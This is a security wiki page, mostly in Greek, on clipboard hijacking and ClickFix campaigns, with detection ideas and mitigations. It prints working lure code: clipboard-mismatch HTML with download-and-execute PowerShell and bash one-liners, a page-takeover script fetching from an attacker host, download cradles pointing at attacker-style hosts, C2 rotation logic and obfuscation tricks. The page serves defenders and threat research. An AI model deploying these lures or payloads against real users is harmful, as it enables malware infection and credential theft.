# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Never paste anything you did not copy yourself." – παλιά αλλά ακόμα έγκυρη συμβουλή

## Overview

Το clipboard hijacking – γνωστό και ως *pastejacking* – εκμεταλλεύεται το γεγονός ότι οι χρήστες συχνά κάνουν copy-and-paste εντολές χωρίς να τις ελέγχουν. Μια κακόβουλη web page (ή οποιοδήποτε context με δυνατότητα JavaScript, όπως μια Electron ή Desktop application) τοποθετεί programmatically κείμενο ελεγχόμενο από τον attacker στο system clipboard. Τα θύματα ενθαρρύνονται, συνήθως μέσω προσεκτικά διαμορφωμένων social-engineering οδηγιών, να πατήσουν **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), ή να ανοίξουν ένα terminal και να *επικολλήσουν* το περιεχόμενο του clipboard, εκτελώντας αμέσως arbitrary commands.

Επειδή **δεν γίνεται download αρχείου και δεν ανοίγει κανένα attachment**, η technique παρακάμπτει τους περισσότερους ελέγχους ασφάλειας e-mail και web-content που παρακολουθούν attachments, macros ή direct command execution. Η επίθεση είναι έτσι δημοφιλής σε phishing campaigns που διανέμουν commodity malware families όπως NetSupport RAT, Latrodectus loader ή Lumma Stealer.

## Wallet-address replacement clippers

Μια άλλη παραλλαγή **clipboard hijacking** δεν επικολλά commands καθόλου: περιμένει μέχρι το θύμα να αντιγράψει μια **cryptocurrency wallet address**, και μετά την αντικαθιστά αθόρυβα με μια ελεγχόμενη από τον attacker λίγο πριν το paste. Αυτό είναι ιδιαίτερα αποτελεσματικό απέναντι σε μακριές wallet formats, επειδή οι χρήστες συχνά επαληθεύουν μόνο τα πρώτα/τελευταία characters.

Κοινά πραγματικά χαρακτηριστικά:
- **Thin loader + nested payload**: το ορατό app/exe μοιάζει με νόμιμο εργαλείο trading ή "profit", ενώ το πραγματικό clipper είναι κρυμμένο βαθύτερα στο bundle (για παράδειγμα ένας .NET loader που εκκινεί ένα nested Rust payload).
- **Regex-driven replacement**: το malware ταιριάζει strings όπως `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...`, ή ακόμη και generic **44-character Solana-like** strings και τις ξαναγράφει σε attacker wallets.
- **Wallet rotation at scale**: σύγχρονα Windows samples μπορεί να ενσωματώνουν **χιλιάδες** replacement wallets ανά currency αντί για μία στατική address, μειώνοντας το wallet reputation burn μετά από κάθε κλοπή.

### Windows clipper flow

Μια συνηθισμένη υλοποίηση είναι ένα hidden window καταχωρισμένο με **`AddClipboardFormatListener`**. Σε κάθε clipboard update, το malware συνήθως καλεί:
- **`OpenClipboard`** → πρόσβαση στα τρέχοντα clipboard data.
- **`GetClipboardData`** → ανάγνωση text.
- **`EmptyClipboard`** + **`SetClipboardData`** → αντικατάσταση της wallet string με την τιμή του attacker.

Minimal hunting regexes που συναντώνται συχνά σε clippers:
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
Η επιμονή σε επίπεδο χρήστη είναι αρκετή για impact. Ένα παρατηρούμενο pattern είναι:
- Αντιγραφή του payload στο **`%APPDATA%\silke\silke.exe`**
- Δημιουργία ενός **Startup-folder LNK** κάτω από `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`

Ιδέες για detection:
- Processes που καλούν συνεχώς clipboard APIs ενώ ταυτόχρονα γράφουν κάτω από `%APPDATA%` και τον φάκελο **Startup** του χρήστη.
- Νέα δημιουργία LNK/executable ακολουθούμενη από wallet-address clipboard rewrites.
- Archives ή fake-software bundles που περιέχουν πολλά unused files plus ένα μικρό launcher που ξεκινά ένα nested binary.

### macOS social-engineered quarantine removal + LaunchAgent persistence

Σε macOS, ορισμένες campaigns ship ένα βοηθητικό **`unlocker.command`** και δίνουν οδηγίες στο θύμα να κάνει δεξί κλικ → **Open** αν το Gatekeeper λέει ότι η app είναι damaged ή from an unidentified developer. Το script απλώς αφαιρεί το quarantine και εκκινεί το κοντινό `.app`:
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
Αυτό **δεν** είναι exploit του Gatekeeper· είναι ένα **social-engineered quarantine bypass** που εκμεταλλεύεται το γεγονός ότι οι αποφάσεις του Gatekeeper εξαρτώνται από το `com.apple.quarantine` xattr.

Μετά την εκτέλεση, το clipper μπορεί να επιμείνει ως ο τρέχων χρήστης γράφοντας:
- **`~/launch.sh`** – wrapper script
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent με `RunAtLoad` και `KeepAlive`

Μια χρήσιμη αμυντική λεπτομέρεια είναι ότι ορισμένα samples υλοποιούν ένα **self-healing watchdog** που ξαναγράφει το LaunchAgent και το wrapper κάθε ~30 seconds. Αν αφαιρέσεις πρώτα το plist **χωρίς να σκοτώσεις τη διεργασία που τρέχει**, το malware μπορεί να το δημιουργήσει ξανά αμέσως. Ασφαλής σειρά καθαρισμού:
1. Σκότωσε την ενεργή clipper διεργασία.
2. Unload/delete το LaunchAgent plist.
3. Διέγραψε το `~/launch.sh` και το αντιγραμμένο payload.

### Delivery note: fake reputation as a force multiplier

Για αυτή την οικογένεια, το ίδιο το malware μπορεί να παραμείνει τεχνικά απλό ενώ το **distribution layer** κάνει τη βαριά δουλειά: fake GitHub stars/forks, SourceForge reviews/downloads, YouTube tutorial comments/views, και benign-looking VirusTotal comments/votes χρησιμοποιούνται για να κάνουν το binary να φαίνεται αξιόπιστο πριν την εκτέλεση.

## Forced copy buttons and hidden payloads (macOS one-liners)

Κάποια macOS infostealers κλωνοποιούν installer sites (π.χ. Homebrew) και **αναγκάζουν τη χρήση ενός “Copy” button** ώστε οι χρήστες να μην μπορούν να επιλέξουν μόνο το ορατό κείμενο. Η clipboard entry περιέχει την αναμενόμενη εντολή εγκατάστασης plus ένα προσαρτημένο Base64 payload (π.χ. `...; echo <b64> | base64 -d | sh`), έτσι ένα μόνο paste εκτελεί και τα δύο ενώ το UI κρύβει το επιπλέον stage.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Παλαιότερες campaigns χρησιμοποιούσαν `document.execCommand('copy')`, ενώ οι νεότερες βασίζονται στο ασύγχρονο **Clipboard API** (`navigator.clipboard.writeText`).

## The ClickFix / ClearFake Flow

1. Ο χρήστης επισκέπτεται ένα typosquatted ή compromised site (π.χ. `docusign.sa[.]com`)
2. Το injected **ClearFake** JavaScript καλεί έναν `unsecuredCopyToClipboard()` helper που αποθηκεύει αθόρυβα ένα Base64-encoded PowerShell one-liner στο clipboard.
3. Οι HTML οδηγίες λένε στο θύμα να: *“Πατήστε **Win + R**, κάντε paste το command και πατήστε Enter για να επιλυθεί το πρόβλημα.”*
4. Το `powershell.exe` εκτελείται, κατεβάζοντας ένα archive που περιέχει ένα legitimate executable μαζί με ένα malicious DLL (classic DLL sideloading).
5. Ο loader decrypts επιπλέον stages, injects shellcode και εγκαθιστά persistence (π.χ. scheduled task) – τελικά εκτελώντας NetSupport RAT / Latrodectus / Lumma Stealer.

### Example NetSupport RAT Chain
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legitimate Java WebStart) αναζητά στον κατάλογό του το `msvcp140.dll`.
* Το κακόβουλο DLL επιλύει δυναμικά APIs με **GetProcAddress**, κατεβάζει δύο binaries (`data_3.bin`, `data_4.bin`) μέσω **curl.exe**, τα αποκρυπτογραφεί χρησιμοποιώντας ένα rolling XOR key `"https://google.com/"`, injects το τελικό shellcode και κάνει unzip το **client32.exe** (NetSupport RAT) στο `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Κατεβάζει το `la.txt` με **curl.exe**
2. Εκτελεί τον JScript downloader μέσα στο **cscript.exe**
3. Ανακτά ένα MSI payload → αφήνει το `libcef.dll` δίπλα σε μια signed application → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer via MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
Το **mshta** καλεί ένα κρυφό PowerShell script που ανακτά το `PartyContinued.exe`, εξάγει το `Boat.pst` (CAB), ανακατασκευάζει το `AutoIt3.exe` μέσω `extrac32` & file concatenation και τελικά εκτελεί ένα `.a3x` script που εξάγει browser credentials στο `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Ορισμένες εκστρατείες ClickFix παραλείπουν εντελώς τα file downloads και καθοδηγούν τα θύματα να κάνουν paste ένα one-liner που ανακτά και εκτελεί JavaScript μέσω WSH, το διατηρεί και κάνει rotate το C2 καθημερινά. Παράδειγμα αλυσίδας που παρατηρήθηκε:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Κύρια χαρακτηριστικά
- Το obfuscated URL αντιστρέφεται κατά το runtime για να αποφεύγει την επιφανειακή επιθεώρηση.
- Το JavaScript επιμένει μέσω ενός Startup LNK (WScript/CScript), και επιλέγει το C2 με βάση την τρέχουσα ημέρα – επιτρέποντας γρήγορη εναλλαγή domain.

Ελάχιστο JS fragment που χρησιμοποιείται για την εναλλαγή των C2s ανά ημερομηνία:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Το επόμενο στάδιο συνήθως αναπτύσσει έναν loader που δημιουργεί persistence και κατεβάζει ένα RAT (π.χ. PureHVNC), συχνά κάνοντας pinning TLS σε ένα hardcoded certificate και chunking της κίνησης.

Ιδέες ανίχνευσης ειδικά για αυτήν την παραλλαγή
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (ή `cscript.exe`).
- Startup artifacts: LNK στο `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` που καλεί WScript/CScript με διαδρομή JS κάτω από `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU και command-line telemetry που περιέχουν `.split('').reverse().join('')` ή `eval(a.responseText)`.
- Επαναλαμβανόμενο `powershell -NoProfile -NonInteractive -Command -` με μεγάλο stdin payload για feeding μακρών scripts χωρίς μακρές command lines.
- Scheduled Tasks που στη συνέχεια εκτελούν LOLBins όπως `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` υπό task/path που μοιάζει με updater (π.χ. `\GoogleSystem\GoogleUpdater`).

Threat hunting
- C2 hostnames και URLs με κυλιόμενη ημερήσια αλλαγή και pattern `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Συσχέτισε events εγγραφής clipboard που ακολουθούνται από Win+R paste και αμέσως μετά από εκτέλεση `powershell.exe`.


Οι Blue-teams μπορούν να συνδυάσουν telemetry από clipboard, process-creation και registry για να εντοπίσουν abuse μέσω pastejacking:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` κρατά ιστορικό από εντολές **Win + R** – αναζήτησε ασυνήθιστες Base64 / obfuscated εγγραφές.
* Security Event ID **4688** (Process Creation) όπου `ParentImage` == `explorer.exe` και `NewProcessName` σε { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** για δημιουργίες αρχείων κάτω από `%LocalAppData%\Microsoft\Windows\WinX\` ή προσωρινούς φακέλους ακριβώς πριν από το ύποπτο 4688 event.
* EDR clipboard sensors (αν υπάρχουν) – συσχέτισε `Clipboard Write` αμέσως ακολουθούμενο από νέο PowerShell process.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Πρόσφατες campaigns παράγουν μαζικά ψεύτικες σελίδες επαλήθευσης CDN/browser ("Just a moment…", IUAM-style) που εξαναγκάζουν τους χρήστες να αντιγράφουν OS-specific commands από το clipboard τους σε native consoles. Αυτό μεταφέρει την εκτέλεση έξω από το browser sandbox και λειτουργεί σε Windows και macOS.

Κύρια χαρακτηριστικά των builder-generated pages
- OS detection μέσω `navigator.userAgent` για προσαρμογή payloads (Windows PowerShell/CMD vs. macOS Terminal). Προαιρετικά decoys/no-ops για unsupported OS ώστε να διατηρείται η ψευδαίσθηση.
- Αυτόματο clipboard-copy σε αθώες UI ενέργειες (checkbox/Copy) ενώ το ορατό κείμενο μπορεί να διαφέρει από το clipboard content.
- Mobile blocking και ένα popover με βήμα-βήμα οδηγίες: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Προαιρετικό obfuscation και single-file injector για να αντικαθιστά το DOM ενός compromised site με Tailwind-styled verification UI (χωρίς να απαιτείται νέα domain registration).

Παράδειγμα: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
Διατήρηση του macOS στην αρχική εκτέλεση
- Χρησιμοποίησε `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` ώστε η εκτέλεση να συνεχίζεται αφού κλείσει το τερματικό, μειώνοντας τα ορατά ίχνη.

Άμεση κατάληψη σελίδας σε παραβιασμένους ιστότοπους
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Ιδέες ανίχνευσης & hunting ειδικά για IUAM-style lures
- Web: Σελίδες που δένουν το Clipboard API με verification widgets· ασυμφωνία μεταξύ του εμφανιζόμενου κειμένου και του clipboard payload· `navigator.userAgent` branching· Tailwind + single-page replace σε ύποπτα contexts.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` λίγο μετά από browser interaction· batch/MSI installers που εκτελούνται από `%TEMP%`.
- macOS endpoint: Terminal/iTerm που κάνει spawning `bash`/`curl`/`base64 -d` με `nohup` κοντά σε browser events· background jobs που επιβιώνουν μετά το κλείσιμο του terminal.
- Συσχέτισε το `RunMRU` Win+R history και τις clipboard writes με επακόλουθη δημιουργία console process.

Δες επίσης για supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix evolutions (ClearFake, Scarlet Goldfinch)

- Το ClearFake συνεχίζει να compromise WordPress sites και να injectάρει loader JavaScript που αλυσιδώνει εξωτερικούς hosts (Cloudflare Workers, GitHub/jsDelivr) και ακόμη blockchain “etherhiding” calls (π.χ. POSTs σε Binance Smart Chain API endpoints όπως `bsc-testnet.drpc[.]org`) για να τραβήξει το current lure logic. Πρόσφατα overlays χρησιμοποιούν έντονα fake CAPTCHAs που καθοδηγούν τους χρήστες να copy/paste ένα one-liner (T1204.004) αντί να κάνουν download οτιδήποτε.
- Το Initial execution ανατίθεται ολοένα και περισσότερο σε signed script hosts/LOLBAS. Οι αλυσίδες του Ιανουαρίου 2026 αντικατέστησαν την προηγούμενη χρήση του `mshta` με το built-in `SyncAppvPublishingServer.vbs` που εκτελείται μέσω `WScript.exe`, περνώντας PowerShell-like arguments με aliases/wildcards για να fetch remote content:
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` είναι signed και χρησιμοποιείται κανονικά από το App-V· σε συνδυασμό με `WScript.exe` και ασυνήθιστες παραμέτρους (`gal`/`gcm` aliases, wildcarded cmdlets, jsDelivr URLs) γίνεται στάδιο LOLBAS υψηλού σήματος για το ClearFake.
- Τον Φεβρουάριο του 2026 τα fake CAPTCHA payloads επέστρεψαν σε καθαρά PowerShell download cradles. Δύο ζωντανά παραδείγματα:
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- Το πρώτο chain είναι ένα in-memory `iex(irm ...)` grabber· το δεύτερο κάνει stage μέσω `WinHttp.WinHttpRequest.5.1`, γράφει ένα προσωρινό `.ps1`, και μετά το εκκινεί με `-ep bypass` σε hidden window.

Detection/hunting tips for these variants
- Process lineage: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` ή PowerShell cradles αμέσως μετά από clipboard writes/Win+R.
- Command-line keywords: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domains, ή raw IP `iex(irm ...)` patterns.
- Network: outbound σε CDN worker hosts ή blockchain RPC endpoints from script hosts/PowerShell shortly after web browsing.
- File/registry: temporary `.ps1` creation under `%TEMP%` plus RunMRU entries containing these one-liners; block/alert on signed-script LOLBAS (WScript/cscript/mshta) executing with external URLs or obfuscated alias strings.

## June 2026 ClickFix tradecraft: paste telemetry, fake verification comments, and LOLBin chaining

Recent Red Canary telemetry shows that the stable indicator is **not one exact command**, but the combination of **user-assisted paste-and-run**, **trusted interpreters/LOLBins**, **obfuscated flags**, **remote retrieval**, and **immediate execution**.

### Notable operator patterns

- **Paste confirmation telemetry**: some payloads call `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` before the real stage. This confirms user interaction while keeping the window short and quiet.
- **Fake verification comments**: PowerShell one-liners may append strings such as `# Security check ✔️ I'm not a robot Verification ID: 138105` so the command still looks CAPTCHA-related after it is pasted into Run / `cmd.exe` / PowerShell history.
- **Dynamic URL reconstruction**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` avoids a static URL in the command line while still performing in-memory download-and-execute.
- **Masqueraded installer execution**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` abuses unusual casing and Unicode-like characters in flags to break brittle detections while still resembling `msiexec.exe`.
- **Caret-escaped LOLBin chains**: `cmd.exe` can hide keywords with `^` escapes (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), start the nested shell minimized, save attacker content with a benign extension such as `.pdf`, and then execute it through `mshta`.
## Mitigations

1. Browser hardening – disable clipboard write-access (`dom.events.asyncClipboard.clipboardItem` etc.) or require user gesture.
2. Security awareness – teach users to *type* sensitive commands or paste them into a text editor first.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control to block arbitrary one-liners.
4. Network controls – block outbound requests to known pastejacking and malware C2 domains.

## Related Tricks

* **Discord Invite Hijacking** often abuses the same ClickFix approach after luring users into a malicious server:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [Red Canary – Intelligence Insights: June 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [Check Point Research – From Stars to Upvotes: Fake Reputation Fueling a Crypto Clipboard Hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)

{{#include ../../banners/hacktricks-training.md}}
